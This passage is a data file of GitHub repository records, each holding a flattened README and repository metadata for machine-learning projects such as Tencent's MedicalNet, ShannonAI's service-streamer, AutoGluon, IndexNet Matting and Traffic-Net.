ResNet18 32 99 0 19 3D ResNet34 63 31 0 22 3D ResNet50 46 21 0 21 3D ResNet101 85 31 0 29 3D ResNet152 117 51 0 34 3D ResNet200 126 74 0 45 Performance Visualization of the segmentation results of our approach vs the comparison ones after the same training epochs It has demonstrated that the efficiency for training convergence and accuracy based on our MedicalNet pre trained models Results of transfer MedicalNet pre trained models to lung segmentation LungSeg and pulmonary nodule classification NoduleCls with Dice and accuracy evaluation metrics respectively Network Pretrain LungSeg Dice NoduleCls accuracy 3D ResNet10 Train from scratch 71 30 79 80 MedicalNet 87 16 86 87 3D ResNet18 Train from scratch 75 22 80 80 MedicalNet 87 26 88 89 3D ResNet34 Train from scratch 76 82 83 84 MedicalNet 89 31 89 90 3D ResNet50 Train from scratch 71 75 84 85 MedicalNet 93 31 89 90 3D ResNet101 Train from scratch 72 10 81 82 MedicalNet 92 79 90 91 3D ResNet152 Train from scratch 73 29 73 74 MedicalNet 92 33 90 91 3D ResNet200 Train from scratch 71 29 76 77 MedicalNet 92 06 90 91 Please refer to Med3D Transfer Learning for 3D Medical Image Analysis https arxiv org abs 1904 00625 for more details TODO x 3D ResNet series pre trained models x Transfer learning training code x Training with multi gpu 3D efficient pre trained modelse g 3D MobileNet 3D ShuffleNet 2D medical pre trained models x Pre trained MedicalNet models based on more medical dataset Acknowledgement We thank 3D ResNets PyTorch https github com kenshohara 3D ResNets PyTorch and MRBrainS18 https mrbrains18 isi uu nl which we build MedicalNet refer to this releasing code and the dataset Contribution If you want to contribute to MedicalNet be sure to review the contribution guidelines https github com Tencent MedicalNet blob master CONTRIBUTING md,2019-07-17T09:53:10Z,2019-12-14T17:43:09Z,Python,Tencent,Organization,37,711,180,24,master,cshwhale,1,0,0,27,13,2,0
ShannonAI,service-streamer,bert#deep-learning#model-deployment#pytorch#tensorflow#web,Service Streamer Boosting your Web Services of Deep Learning Applications README What is Service Streamer Highlights Installation Develop BERT Service in 5 Minutes API Benchmark FAQ Made by ShannonAI globewithmeridians http www shannonai com What is Service Streamer A mini batch collects data samples and is usually used in deep learning models In this way models can utilize the parallel computing capability of GPUs However requests from users for web services are usually discrete If using conventional loop server or threaded server GPUs will be idle dealing with one request at a time And the latency time will be linearly increasing when there are concurrent user requests ServiceStreamer is a middleware for web service of machine learning applications Queue requests from users are sampled into mini batches ServiceStreamer can significantly enhance the overall performance of the system by improving GPU utilization Highlights hatchingchick Easy to use Minor changes can speed up the model ten times zap Fast processing speed Low latency for online inference of machine learning models octopus Good expandability Easy to be applied to multi GPU scenarios for handling enormous requests crossedswords Applicability Used with any web frameworks and or deep learning frameworks Installation Install ServiceStream by using pip requires Python 3 5 bash pip install servicestreamer Develop BERT Service in 5 Minutes We provide a step by step tutorial for you to bring BERT online in 5 minutes The service processes 1400 sentences per second Text Infilling is a task in natural language processing given a sentence with several words randomly removed the model predicts those words removed through the given context BERT has attracted a lot of attention in these two years and it achieves State Of The Art results across many nlp tasks BERT utilizes Masked Language Model MLM as one of the pre training objectives MLM models randomly mask some of the tokens from the input and the objective is to predict the original vocabulary id of the masked word based on its context MLM has similarities with text infilling It is natural to introduce BERT to text infilling task 1 First we define a model for text filling task bertmodel py example bertmodel py The predict function accepts a batch of sentences and returns predicted position results of the MASK token python class TextInfillingModel object batch twinkle twinkle MASK star Happy birthday to MASK the answer to life the MASK and everything model TextInfillingModel outputs model predict batch print outputs little you universe Note Please download pre trained BERT model at first 2 Second utilize Flask https github com pallets flask to pack predicting interfaces to Web service flaskexample py example flaskexample py python model TextInfillingModel app route naive methods POST def naivepredict inputs request form getlist s outputs model predict inputs return jsonify outputs app run port 5005 Please run flaskexample py example flaskexample py then you will get a vanilla Web server bash curl X POST http localhost 5005 naive d s Happy birthday to MASK you At this time your web server can only serve 12 requests per second Please see benchmark benchmark for more details 3 Third encapsulate model functions through servicestreamer Three lines of code make the prediction speed of BERT service reach 200 sentences per second 16x faster python from servicestreamer import ThreadedStreamer streamer ThreadedStreamer model predict batchsize 64 maxlatency 0 1 app route stream methods POST def streampredict inputs request form getlist s outputs streamer predict inputs return jsonify outputs app run port 5005 debug False Run flaskexample py example flaskexample py and test the performance with wrk https github com wg wrk bash wrk t 2 c 128 d 20s timeout 10s s benchmark lua http 127 0 0 1 5005 stream Requests sec 200 31 4 Finally encapsulate models through Streamer and start service workers on multiple GPUs Streamer further accelerates inference speed and achieves 1000 sentences per second 80x faster python from servicestreamer import ManagedModel Streamer class ManagedBertModel ManagedModel def initmodel self self model TextInfillingModel def predict self batch return self model predict batch streamer Streamer ManagedBertModel batchsize 64 maxlatency 0 1 workernum 8 cudadevices 0 1 2 3 app run port 5005 debug False 8 gpu workers can be started and evenly distributed on 4 GPUs API Quick Start In general the inference speed will be faster by utilizing parallel computing python outputs model predict batchinputs ServiceStreamer is a middleware for web service of machine learning applications Queue requests from users are scheduled into mini batches and forward into GPU workers ServiceStreamer sacrifices a certain delay default maximum is 0 1s and enhance the overall performance by improving the ratio of GPU utilization python from servicestreamer import ThreadedStreamer Encapsulate batchpredict function with Streamer streamer ThreadedStreamer model predict batchsize 64 maxlatency 0 1 Replace model predict with streamer predict outputs streamer predict batchinputs Start web server on multi threading or coordination Your server can usually achieve 10x batchsize batchperrequest times faster by adding a few lines of code Distributed GPU worker The performance of web server QPS in practice is much higher than that of GPU model We also support one web server with multiple GPU worker processes python from servicestreamer import Streamer Spawn releases 4 gpu worker processes streamer Streamer model predict 64 0 1 workernum 4 outputs streamer predict batch Streamer uses spawn subprocesses to run gpu workers by default Streamer uses interprocess queues to communicate and queue It can distribute a large number of requests to multiple workers for processing Then the prediction results of the model are returned to the corresponding web server in batches And results are forwarded to the corresponding http response NVIDIA SMI 390 116 Driver Version 390 116 Processes GPU Memory GPU PID Type Process name Usage 0 7574 C home liuxin nlp venv bin python 1889MiB 1 7575 C home liuxin nlp venv bin python 1889MiB 2 7576 C home liuxin nlp venv bin python 1889MiB 3 7577 C home liuxin nlp venv bin python 1889MiB The above method is simple to define but the main process initialization model takes up an extra portion of memory And the model can only run on the same GPU Therefore we have provided the ManagedModel class to facilitate model lazy initialization and migration while supporting multiple GPUs python from servicestreamer import ManagedModel class ManagedBertModel ManagedModel def initmodel self self model Model def predict self batch return self model predict batch Spawn produces 4 gpu worker processes which are evenly distributed on 0 1 2 3 GPU streamer Streamer ManagedBertModel 64 0 1 workernum 4 cudadevices 0 1 2 3 outputs streamer predict batch Distributed Web Server Some cpu intensive calculations such as image and text preprocessing need to be done first in web server The preprocessed data is then forward into GPU worker for predictions CPU resources often become performance bottlenecks in practice Therefore we also provide the mode of multi web servers matching single or multiple gpu workers Use RedisStream to specify a unique Redis address for all web servers and gpu workers python default parameters can be omitted and localhost 6379 is used streamer RedisStreamer redisbroker 172 22 22 22 6379 We make use of gunicorn or uwsgi to implement reverse proxy and load balancing bash cd example gunicorn c redisstreamergunicorn py flaskexample app Each request will be load balanced to each web server for cpu preprocessing and then evenly distributed to gpu worker for model prediction Future API You might be familiar with future if you have used any concurrent library You can use the Future API directly if you want to use servicestreamer for queueing requests or distributed GPU computing and using scenario is not web service python from servicestreamer import ThreadedStreamer streamer ThreadedStreamer model predict 64 0 1 xs for i in range 200 future streamer submit How are you Fine Thank you xs append future Get all instances of future object and wait for asynchronous responses for future in xs outputs future result print outputs Benchmark Benchmark We utilize wrk https github com wg wrk to conduct benchmark test Test examples and scripts can be found in example example Environment gpu Titan Xp cuda 9 0 pytorch 1 1 Single GPU process bash start flask threaded server python example flaskexample py benchmark naive api without servicestreamer wrk t 4 c 128 d 20s timeout 10s s benchmark lua http 127 0 0 1 5005 naive benchmark stream api with servicestreamer wrk t 4 c 128 d 20s timeout 10s s benchmark lua http 127 0 0 1 5005 stream Naive ThreaedStreamer Streamer RedisStreamer qps 12 78 207 59 321 70 372 45 latency 8440ms 603 35ms 392 66ms 340 74ms Multiple GPU processes The performance loss of the communications and load balancing mechanism of multi gpu workers are verified compared with a single web server process We adopt gevent server because multi threaded Flask server has become a performance bottleneck Please refer to the flaskmultigpuexample py example flaskmultigpuexample py bash wrk t 8 c 512 d 20s timeout 10s s benchmark lua http 127 0 0 1 5005 stream gpuworkernum Naive ThreadedStreamer Streamer RedisStreamer 1 11 62 211 02 362 69 365 80 2 N A N A 488 40 609 63 4 N A N A 494 20 1034 57 Threaded Streamer Due to the limitation of Python GIL multi worker is meaningless We conduct comparison studies using single GPU worker Streamer Performance improvement is not linear when it is greater than 2 gpu worker The utilization rate of CPU reaches 100 The bottleneck is CPU at this time and the performance issue of flask is the obstacle Utilize Future API to start multiple GPU processes We adopt Future API future api to conduct multi GPU benchmeark test locally in order to reduce the performance influence of web server Please refer to code example in futureexample py example futureexample py gpuworkernum Batched ThreadedStreamer Streamer RedisStreamer 1 422 883 401 01 399 26 384 79 2 N A N A 742 16 714 781 4 N A N A 1400 12 1356 47 It can be seen that the performance of servicestreamer is almost linearly related to the number of gpu workers Communications of inter process in servicestreamer is more efficient than redis FAQ Q using a model trained from allennlp https github com allenai allennlp set workernum 4 of Streamer servicestreamer servicestreamer py during inference what s the reason that 16 core cpu is full and speed is slower than Streamer servicestreamer servicestreamer py with workernum 1 A for multi process inference if the model process data using numpy with multi thread it may cause cpu overheads resulting in a multi core computing speed that slower than a single core This kind of problem may occur when using third party libraries such as alennlp spacy etc It could be solved by setting numpy threads environment variables python import os os environ MKLNUMTHREADS 1 export MKLNUMTHREADS 1 os environ NUMEXPRNUMTHREADS 1 export NUMEXPRNUMTHREADS 1 os environ OMPNUMTHREADS 1 export OMPNUMTHREADS 1 import numpy make sure putting environment variables before import numpy Q When using RedisStreamer if there are only one redis broker and more than one model the input batches may have different structure How to deal with such situation A Specify the prefix when initializing worker and streamer each streamer will use a unique channel example of initialiazing workers python from servicestreamer import runredisworkersforever from bertmodel import ManagedBertModel if name main from multiprocessing import freezesupport freezesupport runredisworkersforever ManagedBertModel 64 prefix channel1 runredisworkersforever ManagedBertModel 64 prefix channel2 example of using streamer to have result python from servicestreamer import RedisStreamer streamer1 RedisStreaemr prefix channel1 streamer2 RedisStreaemr prefix channel2 predict output1 streamer1 predict batch output2 streamer2 predict batch,2019-08-05T11:52:27Z,2019-12-12T18:42:50Z,Python,ShannonAI,Organization,11,393,57,119,master,Meteorix#pku-wuwei#stepperL#FeiWang96#wking-tao#hzwdachui#taomiao,7,0,4,5,16,1,29
dpressel,dliss-tutorial,deep-learning#machine-learning#nlp,dliss tutorial Tutorial for International Summer School on Deep Learning 2019 http dl lab eu in Gdansk Poland Sections Overview Talk https docs google com presentation d 1DJI1yX4U5IgApGwavt0AmOCLWwso7ou1Un93sMuAWmA Tutorial There are currently 3 hands on sections to this tutorial The first section 1pretrainedvectors ipynb covers pre trained word embeddings colab https colab research google com github dpressel dlss tutorial blob master 1pretrainedvectors ipynb The second section 2contextvectors ipynb covers pre trained contextual emeddings colab https colab research google com github dpressel dlss tutorial blob master 2contextvectors ipynb The third section 3finetuning ipynb covers fine tuning a pre trained model colab https colab research google com github dpressel dlss tutorial blob master 3finetuning ipynb,2019-06-26T02:59:24Z,2019-12-12T02:28:10Z,Jupyter Notebook,dpressel,User,19,316,62,35,master,dpressel,1,0,0,1,0,0,0
Lyken17,pytorch-memonger,n/a,pytorch memonger This is a re implementation of Training Deep Nets with Sublinear Memory Cost https arxiv org abs 1604 06174 You may also want to have a look at the original mxnet implementation https github com dmlc mxnet memonger and OpenAI s tensorflow implementation https github com openai gradient checkpointing Speed Memory Comparision Model Batch size 16 Memory Speed original resnet152 5459MiB 2 9258 iter s Checkpoint Sublinear 2455MiB 2 6273 iter s How to use Different from TensorFlow and mxnet where the computation graph is static and known before actual computing pytorch s philosophy is define by run and the graph details are not known until forward is finished This implemention only supports Sequential models By replacing nn Sequential with memonger SublinearSequential the memory required for backward is reduced from O N to O sqrt N python previous O N memory footprint import torch nn as nn net1 nn Sequential nn Conv2d 3 16 kernel 3 padding 1 nn BatchNorm2d 16 nn ReLU nn Conv2d 16 16 kernel 3 padding 1 nn BatchNorm2d 16 nn ReLU nn Conv2d 16 16 kernel 3 padding 1 nn BatchNorm2d 16 nn ReLU optimized O sqrt N memory footprint from momonger import SublinearSequential net2 SublinearSequential list net1 children Caution Since sublinear memory optimization requires re forwarding if your model contains layer with non derministic behavior e g BatchNorm Dropout you need to be careful when using the module I have supported BatchNorm by re scaling momentum momonger memonger py L24 Support for dropout is still under construction,2019-07-19T00:36:29Z,2019-12-14T05:25:05Z,Python,Lyken17,User,2,225,18,8,master,Lyken17,1,0,0,1,1,0,1
awslabs,autogluon,automl#computer-vision#data-science#deep-learning#distributed-computing#ensemble-learning#gluon#image-classification#machine-learning#mxnet#natural-language-processing#object-detection#pytorch#structured-data#transfer-learning,AutoGluon AutoML Toolkit for Deep Learning Build Status http ci mxnet io view all job autogluon job master badge icon http ci mxnet io view all job autogluon job master Pypi Version https img shields io pypi v autogluon svg https pypi org project autogluon history AutoGluon automates machine learning tasks enabling you to easily achieve strong predictive performance in your applications With just a few lines of code you can train and deploy high accuracy deep learning models on image text and tabular data Get started with First install package from terminal pip install mxnet autogluon from autogluon import TabularPrediction as task traindata task Dataset filepath https autogluon s3 amazonaws com datasets Inc train csv testdata task Dataset filepath https autogluon s3 amazonaws com datasets Inc test csv predictor task fit traindata traindata label class performance predictor evaluate testdata See the AutoGluon Website http autogluon mxnet io index html for instructions on Installing AutoGluon http autogluon mxnet io index html installation Learning with image data http autogluon mxnet io tutorials imageclassification beginner html Learning with text data http autogluon mxnet io tutorials textclassification beginner html Learning with data in tabular format http autogluon mxnet io tutorials tabularprediction tabular quickstart html More advanced topics such as Neural Architecture Search http autogluon mxnet io tutorials nas index html License This library is licensed under the Apache 2 0 License,2019-07-29T18:51:24Z,2019-12-15T03:22:10Z,Python,awslabs,Organization,23,153,10,100,master,zhanghang1989#cgraywang#jwmueller#Innixma#mseeger#chongruo#jpeddicord#mli#PatriciaXiao#piyushghai#TEChopra1000#kateglee#sgdread,13,1,1,28,53,4,85
hiredscorelabs,tamnun-ml,deep-learning#machine-learning#natural-language-processing#transfer-learning,media cover png Tamnun ML PyPI pyversions https img shields io badge python 3 6 20 7C 203 7 blue https img shields io badge python 3 6 20 7C 203 7 blue CircleCI https circleci com gh hiredscorelabs tamnun ml svg style svg https circleci com gh hiredscorelabs tamnun ml tamnun is a python framework for Machine and Deep learning algorithms and methods especially in the field of Natural Language Processing and Transfer Learning The aim of tamnun is to provide an easy to use interfaces to build powerful models based on most recent SOTA methods For more about tamnun feel free to read the introduction to TamnunML on Medium https medium com hiredscore engineering introducing octoml 73bd527491b1 Getting Started tamnun depends on several other machine learning and deep learning frameworks like pytorch keras and others To install tamnun and all it s dependencies run git clone https github com hiredscorelabs tamnun ml cd tamnun ml python setup py install Or using PyPI pip install tamnun Jump in and try out an example cd examples python finetunebert py Or take a look at the Jupyer notebooks here notebooks BERT BERT stands for Bidirectional Encoder Representations from Transformers which is a language model trained by Google and introduced in their paper https arxiv org abs 1810 04805 Here we use the excellent PyTorch Pretrained BERT https pypi org project pytorch pretrained bert library and wrap it to provide an easy to use scikit learn https scikit learn org interface for easy BERT fine tuning At the moment tamnun BERT classifier supports binary and multi class classification To fine tune BERT on a specific task python from tamnun bert import BertClassifier BertVectorizer from sklearn pipeline import makepipeline clf makepipeline BertVectorizer BertClassifier numofclasses 2 fit trainX trainy predicted clf predict testX Please see this notebook https github com hiredscorelabs tamnun ml blob master notebooks finetunebert ipynb for full code example Fitting almost any PyTorch Module using just one line You can use the TorchEstimator object to fit any pytorch module with just one line python from torch import nn from tamnun core import TorchEstimator module nn Linear 128 2 clf TorchEstimator module tasktype classification fit trainX trainy See this file https github com hiredscorelabs tamnun ml blob master examples linearmnist py for a full example of fitting nn Linear module on the MNIST http yann lecun com exdb mnist classification of handwritten digits dataset Distiller Transfer Learning This module distills a very big like BERT model into a much smaller model Inspired by this paper https arxiv org abs 1503 02531 python from tamnun bert import BertClassifier BertVectorizer from tamnun transfer import Distiller bertclf makepipeline BertVectorizer dotruncate True maxlen 3 BertClassifier numofclasses 2 distilledclf makepipeline CountVectorizer ngramrange 1 3 LinearRegression distiller Distiller teachermodel bertclf teacherpredictfunc bertclf decisionfunction studentmodel distilledclf fit traintexts trainy unlabeledX unlabeledtexts predictedlogits distiller transform testtexts For full BERT distillation example see this https github com hiredscorelabs tamnun ml blob master notebooks distillbert ipynb notebook Support Getting Help You can ask questions and join the development discussion on Github Issues https github com hiredscorelabs tamnun ml issues License Apache License 2 0 Same as Tensorflow,2019-07-25T08:46:47Z,2019-11-18T08:00:42Z,Jupyter Notebook,hiredscorelabs,Organization,7,100,6,16,master,shudima#jondot,2,0,0,4,0,0,3
dongminlee94,Samsung-DRL-Code,deep-reinforcement-learning#model-free-rl#pytorch#pytorch-rl#reinforcement-learning,Deep Reinforcement Learning Summer 2019 Samsung This repository contains codes for Deep Reinforcement Learning DRL algorithms with PyTorch v0 4 1 It also provides lecture slides that explain codes in detail The agents with the DRL algorithms have been implemented and trained using classic control environments in OpenAI Gym CartPole https gym openai com envs CartPole v1 Pendulum https gym openai com envs Pendulum v0 Table of Contents 00 Prerequisite 1 Install from Anaconda to OpenAI Gym Window Ver MacOS Ver https github com dongminlee94 Samsung DRL Code tree master 0Prerequisite 01Install 2 Numpy https github com dongminlee94 Samsung DRL Code tree master 0Prerequisite 02Numpy 01 Deep Learning with PyTorch Slide https github com dongminlee94 Samsung DRL Code blob master 1DLPytorch DLPyTorch pdf Code https github com dongminlee94 Samsung DRL Code blob master 1DLPytorch PyTorch py 02 Deep Q Network DQN Double DQN DDQN Slide https github com dongminlee94 Samsung DRL Code blob master 2DQNDDQN DDQN pdf DQN Code https github com dongminlee94 Samsung DRL Code tree master 2DQNDDQN dqn DDQN Code https github com dongminlee94 Samsung DRL Code tree master 2DQNDDQN ddqn 03 Advantage Actor Critic A2C Deep Deterministic Policy Gradient DDPG 1 A2C Slide https github com dongminlee94 Samsung DRL Code blob master 3A2CDDPG A2C pdf Code https github com dongminlee94 Samsung DRL Code tree master 3A2CDDPG a2c 2 DDPG Slide https github com dongminlee94 Samsung DRL Code blob master 3A2CDDPG DDPG pdf Code https github com dongminlee94 Samsung DRL Code tree master 3A2CDDPG ddpg 04 Trust Region Policy Optimization TRPO Proximal Policy Optimization PPO 1 TRPO Slide https github com dongminlee94 Samsung DRL Code blob master 4TRPOPPO TRPO pdf Code https github com dongminlee94 Samsung DRL Code tree master 4TRPOPPO trpo 2 TRPO GAE Slide https github com dongminlee94 Samsung DRL Code blob master 4TRPOPPO GAE pdf Code https github com dongminlee94 Samsung DRL Code tree master 4TRPOPPO trpogae 3 PPO Code https github com dongminlee94 Samsung DRL Code tree master 4TRPOPPO ppo 4 PPO GAE Slide https github com dongminlee94 Samsung DRL Code blob master 4TRPOPPO PPO pdf Code https github com dongminlee94 Samsung DRL Code tree master 4TRPOPPO ppogae 05 Soft Actor Critic SAC Slide https github com dongminlee94 Samsung DRL Code blob master 5SAC SAC pdf Code https github com dongminlee94 Samsung DRL Code tree master 5SAC sac Learning curve CartPole Pendulum Paper Deep Q Network DQN https storage googleapis com deepmind media dqn DQNNaturePaper pdf Double DQN DDQN https arxiv org pdf 1509 06461 pdf Advantage Actor Critic A2C http incompleteideas net book RLbook2018 pdf Asynchronous Advantage Actor Critic A3C https arxiv org pdf 1602 01783 pdf Deep Deterministic Policy Gradient DDPG https arxiv org pdf 1509 02971 pdf Trust Region Policy Optimization TRPO https arxiv org pdf 1502 05477 pdf Generalized Advantage Estimator GAE https arxiv org pdf 1506 02438 pdf Proximal Policy Optimization PPO https arxiv org pdf 1707 06347 pdf Soft Actor Critic SAC https arxiv org pdf 1812 05905 pdf Reference Minimal and Clean Reinforcement Learning Examples in PyTorch https github com reinforcement learning kr reinforcement learning pytorch Pytorch implementation for Policy Gradient algorithms REINFORCE NPG TRPO PPO https github com reinforcement learning kr pgtravel Pytorch implementation of SAC1 https github com vitchyr rlkit tree master rlkit torch sac Pytorch implementation of SAC2 https github com pranz24 pytorch soft actor critic,2019-07-02T04:52:52Z,2019-11-23T06:48:39Z,Python,dongminlee94,User,2,92,19,68,master,dongminlee94,1,0,0,0,0,0,0
poppinace,indexnet_matting,n/a,IndexNet Matting This repository includes the official implementation of IndexNet Matting for deep image matting presented in our paper Indices Matter Learning to Index for Deep Image Matting https arxiv org pdf 1908 00672 pdf Proc IEEE CVF International Conference on Computer Vision ICCV 2019 Hao Lu https sites google com site poppinace 1 Yutong Dai1 Chunhua Shen http cs adelaide edu au chhshen 1 Songcen Xu2 1The University of Adelaide Australia 2Noah s Ark Lab Huawei Technologies Updates 5 Aug 2019 Inference code of IndexNet Matting is released 16 Aug 2019 The supplementary material is finalized and released Highlights Simple and effective IndexNet Matting only deals with the upsampling stage but exhibits at least 16 1 relative improvements compared to the Deep Matting baseline Memory efficient IndexNet Matting builds upon MobileNetV2 It can process an image with a resolution up to 1980x1080 on a single GTX 1070 Easy to use This framework also includes our re implementation of Deep Matting and the pretrained model presented in the Adobe s CVPR17 paper Installation Our code has been tested on Python 3 6 8 3 7 2 and PyTorch 0 4 1 1 1 0 Please follow the official instructions to configure your environment See other required packages in requirements txt A Quick Demo We have included our pretrained model in pretrained and several images and trimaps from the Adobe Image Dataset in examples Run the following command for a quick demonstration of IndexNet Matting The inferred alpha mattes are in the folder examples mattes python scripts demo py Prepare Your Data 1 Please contact Brian Price bprice adobe com requesting for the Adobe Image Matting dataset 2 Composite the dataset using provided foreground images alpha mattes and background images from the COCO and Pascal VOC datasets I slightly modified the provided compositoncode py to improve the efficiency included in the scripts folder Note that since the image resolution is quite high the dataset will be over 100 GB after composition 3 The final path structure used in my code looks like this PATHTODATASET CombinedDataset Trainingset alpha 431 images fg 431 images merged 43100 images Testset alpha 50 images fg 50 images merged 1000 images trimaps 1000 images Inference Run the following command to do inference of IndexNet Matting Deep Matting on the Adobe Image Matting dataset python scripts demoindexnetmatting py python scripts demodeepmatting py Please note that DATADIR should be modified to your dataset directory Images used in Deep Matting has been downsampled by 1 2 to enable the GPU inference To reproduce the full resolution results the inference can be executed on CPU which takes about 2 days Here is the results of IndexNet Matting and our reproduced results of Deep Matting on the Adobe Image Dataset Methods Remark Param GFLOPs SAD MSE Grad Conn Model Deep Matting Paper 54 6 0 017 36 7 55 3 Deep Matting Re implementation 130 55M 32 34 55 8 0 018 34 6 56 8 Google Drive 522MB https drive google com open id 1Uws86AGkFqV2S7XkNuR8dz5SOttxh7AY IndexNet Matting Ours 8 15M 6 30 45 8 0 013 25 9 43 7 Included The original paper reported that there were 491 images but the released dataset only includes 431 images Among missing images 38 of them were said double counted and the other 24 of them were not released As a result we at least use 4 87 fewer training data than the original paper Thus the small differerce in performance should be normal The evaluation code Matlab code implemented by the Deep Image Matting s author placed in the evaluationcode folder is used to report the final performance for a fair comparion We have also implemented a python version The numerial difference is subtle Training Training code is not applicable at present but may be released in the future Citation If you find this work or code useful for your research please cite inproceedingshao2019indexnet title Indices Matter Learning to Index for Deep Image Matting author Lu Hao and Dai Yutong and Shen Chunhua and Xu Songcen booktitle Proc IEEE CVF International Conference on Computer Vision ICCV year 2019 Disclaimer As covered by the ADOBE IMAGE DATASET LICENSE AGREEMENT the trained models included in this repository can only be used and distributed for non commercial purposes Anyone who violates this rule will be at his her own risk,2019-07-23T07:57:30Z,2019-12-03T03:37:00Z,Python,poppinace,User,10,84,22,28,master,poppinace,1,0,0,4,9,0,0
AppleHolic,source_separation,audio#deep-learning#pytorch#source-separation#speech#speech-separation,Source Separation Python 3 6 https img shields io badge python 3 6 blue svg https www python org downloads release python 360 Hits https hits seeyoufarm com api count incr badge svg url https 3A 2F 2Fgithub com 2FAppleholic 2Fsourceseparation https hits seeyoufarm com Introduction Source Separation is a repository to extract speeches from various recorded sounds It focuses to adapt more real like dataset for training models Main components different things The latest model in this repository is basically built with spectrogram based models In mainly Phase aware Speech Enhancement with Deep Complex U Net https arxiv org abs 1903 03107 are implemented with modifications Complex Convolution Masking Weighted SDR Loss And then To more stable inferences in real cases below things are adopted Audioset data is used to augment noises Dataset source is opened on audiosetaugmentor https github com AppleHolic audiosetaugmentor See this link https research google com audioset download html for finding explanations about audioset This repo used Balanced train label dataset Label balanced non human classes 18055 samples Preemphasis is used to remove high frequency noises on adapting real samples It s not official implementation by authors of paper Singing Voice Separation Singing Voice Separation with DSD100 https sigsep github io datasets dsd100 html dataset This model is trained with larger model and higher sample rate 44 1k So it gives more stable and high quality audio Let s checkout Youtube Playlist https www youtube com playlist list PLQ4ukFz6Ieir5bZYOns082gMjt4hYP4I with samples of my favorites Recent Updates Remove deprecation of audioset augmentation It can have problem on preprocessing audioset filter failed downloading file time after check out this line will be removed Update next version of Voice Bank cases 200k training steps Dataset You can use pre defined preprocessing and dataset sources on https github com Appleholic pytorchsound List to be updated Add MUSDB and evaluate results issue 9 Enhance codes for inference Environment Python 3 6 pytorch 1 0 ubuntu 16 04 Brain Cloud Kakaobrain Cluster V2 XLARGE 2 V100 GPUs 28 cores cpu 244 GB memory External Repositories There are three external repositories on this repository These will be updated to setup with recursive clone or internal codes pytorchsound package It is built with using pytorchsound https github com AppleHolic pytorchsound So that pytorchsound is a modeling toolkit that allows engineers to train custom models for sound related tasks Many of sources in this repository are based on pytorchsound template audiosetaugmentor Explained it on above section link https github com AppleHolic audiosetaugmentor pypesq git https github com ludlows python pesq git https github com ludlows python pesq For evaluation PESQ python wrapper repository is added Pretrained Checkpoint General Voice Source Separation Model Name refineunetbase see settings py Link Google Drive https drive google com open id 1JRK 0RVV2o7cyRdvFuwe5iw84ESvfcyR Singing Voice Separation Model Name refineunetlarger Link Google Drive https drive google com open id 1ywgFZ7ms7CmiCCv2MikrKx9g 2j9kd I Current Tag v0 1 1 Predicted Samples General Voice Source Separation Validation 10 random samples Link Google Drive https drive google com open id 1CafFnqWnQvVPu2feNLn6pnjRYIarbP Test Samples Link Google Drive https drive google com open id 19Sn6pe5 BtWXYa6OiLbYGH7iCU mzB8j Singing Voice Seperation Check out my youtube playlist Link Youtube Playlist https www youtube com playlist list PLQ4ukFz6Ieir5bZYOns082gMjt4hYP4I Installation Install above external repos You should see first README md of audiosetaugmentor and pytorchsound to prepare dataset and to train separation models pip install git https github com Appleholic audiosetaugmentor pip install git https github com Appleholic pytorchsound v0 0 3 pip install git https github com ludlows python pesq for evaluation code Install package bash pip install e Usage Train bash python sourceseparation train py YOURMETADIR SAVEDIR MODEL NAME see settings py SAVEPREFIX OTHER OPTIONS Joint Train Voice Bank and DSD100 bash python sourceseparation trainjointly py YOURVOICEBANKMETADIR YOURDSD100METADIR SAVEDIR MODEL NAME see settings py SAVEPREFIX OTHER OPTIONS Synthesize Be careful the differences sample rate between general case and singing voice case If you run more than one it can help to get better result Sapmles voice bank dsd are ran twice Single sample bash python sourceseparation synthesize py separate INPUTPATH OUTPUTPATH MODEL NAME PRETRAINEDPATH OTHER OPTIONS Whole validation samples with evaluation bash python sourceseparation synthesize py validate YOURMETADIR MODEL NAME PRETRAINEDPATH OTHER OPTIONS All samples in given directory bash python sourceseparation synthesize py test dir INPUTDIR OUTPUTDIR MODEL NAME PRETRAINEDPATH OTHER OPTIONS Experiments Reproduce experiments General Voice Separation single train code Pretrained checkpoint is trained on default options Above option will be changed with curriculum learning and the other tries Singing Voice Separation joint train code Pretrained checkpoint is trained on 4 GPUs double 256 batch size Parameters and settings It is tuned to find out good validation WSDR loss refineunetbase 75M refineunetlarger 95M Evaluation Scores on validation dataset PESQ score is evaluated all validation dataset but wdsr loss is picked with best loss of small subset while training is going on Results may vary slightly depending on the meta file random state The validation results tend to be different from the test results Original sample rate is 22050 but PESQ needs 16k So audios are resampled for calculating PESQ General voice bank 200k steps training type score name value without audioset PESQ 2 346 without audioset wsdr loss 0 9389 with audioset PESQ 2 375 with audioset wsdr loss 0 9078 Singing Voice Separation 200k steps WSDR Loss Got an error for calculating PESQ on this case training type value dsd only 0 9593 joint with voice bank 0 9325 Loss curves Voice Bank Train Train L1 Loss curve assets traincurvewsdr png Valid Valid L1 Loss curve assets validcurvewsdr png License This repository is developed by ILJI CHOI https github com Appleholic It is distributed under Apache License 2 0,2019-07-23T23:44:42Z,2019-12-13T03:56:08Z,Python,AppleHolic,User,2,82,10,17,master,AppleHolic,1,0,2,4,8,0,6
OlafenwaMoses,Traffic-Net,n/a,Traffic Net Traffic Net is a dataset containing images of dense traffic sparse traffic accidents and burning vehicles Traffic Net is a dataset of traffic images collected in order to ensure that machine learning systems can be trained to detect traffic conditions and provide real time monitoring analytics and alerts This is part of DeepQuest AI s to train machine learning systems to perceive understand and act accordingly in solving problems in any environment they are deployed This is the first release of the Traffic Net dataset It contains 4 400 images that span cover 4 classes The classes included in this release are Accident Dense Traffic Fire Sparse Traffic There are 1 100 images for each category with 900 images for trainings and 200 images for testing We are working on adding more categories in the future and will continue to improve the dataset DOWNLOAD TRAINING AND PREDICTION The Traffic Net dataset is provided for download in the release section of this repository You can download the dataset via the link below https github com OlafenwaMoses Traffic Net releases tag 1 0 We have also provided a python codebase to download the images train ResNet50 on the images and perform prediction using a pretrained model also using ResNet50 provided in the release section of this repository The python codebase is contained in the trafficnet py file and the model class labels for prediction is also provided the modelclass json The pretrained ResNet50 model is available for download via the link below https github com OlafenwaMoses Traffic Net releases download 1 0 trafficnetresnetmodelex 055acc 0 913750 h5 This pre trained model was trained for 60 epochs only but it achieved over 91 accuracy on 800 test images You can see the prediction results on new images that were not part of the dataset in the Prediction Results section below More experiments will enhance the accuracy of the model Running the experiment or prediction requires that you have Tensorflow and Keras OpenCV and ImageAI installed You can install this dependencies via the commands below Tensorflow 1 4 0 and later versions Install or install via pip pip3 install upgrade tensorflow OpenCV Install or install via pip pip3 install opencv python Keras 2 x Install or install 